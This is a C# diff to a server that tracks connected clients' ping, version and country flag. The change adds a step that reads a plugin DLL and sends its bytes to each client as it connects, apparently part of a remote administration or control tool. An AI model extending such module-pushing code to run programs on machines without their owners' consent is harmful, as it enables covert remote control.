@@ -1,5 +1,7 @@
-﻿using Common.Comunication;
+﻿using ClientInfo;
+using Common.Comunication;
 using Common.DTOs.MessagePack;
+using System.IO;
 using System.Windows;
 using System.Windows.Media.Imaging;
 
@@ -31,7 +33,19 @@ namespace Server.CoreServerFunctionality
             OnPing += HandlePing;
             OnClientInfo += HandleClientInfo;
 
+            SendPlugin(typeof(ClientInfo.Plugin));
             HandlePing(null, EventArgs.Empty);
+        }
+
+        public async Task SendPlugin(Type plugin)
+        {
+            string path = Path.Combine(Directory.GetCurrentDirectory(), plugin.Namespace + ".dll");
+            byte[] bytes = await File.ReadAllBytesAsync(path);
+            await SendPacketAsync(new PluginDTO()
+            {
+                Plugin = bytes,
+                PluginFullName = plugin.FullName,
+            });
         }
 
         private void HandleClientInfo(object? sender, EventArgs e)
@@ -61,7 +75,7 @@ namespace Server.CoreServerFunctionality
             Ping = clientInfoDTO.Ping;
             Version = clientInfoDTO.Version;
             Date = clientInfoDTO.Date;
-            Application.Current.Dispatcher.Invoke(()=> Flag = new BitmapImage(new Uri($"https://flagsapi.com/{clientInfoDTO.Country}/flat/64.png")));
+            Application.Current.Dispatcher.Invoke(() => Flag = new BitmapImage(new Uri($"https://flagsapi.com/{clientInfoDTO.Country}/flat/64.png")));
             ClientHandler.UpdateClients(this).GetAwaiter().GetResult();
         }
         List<Window> windows = new List<Window>();
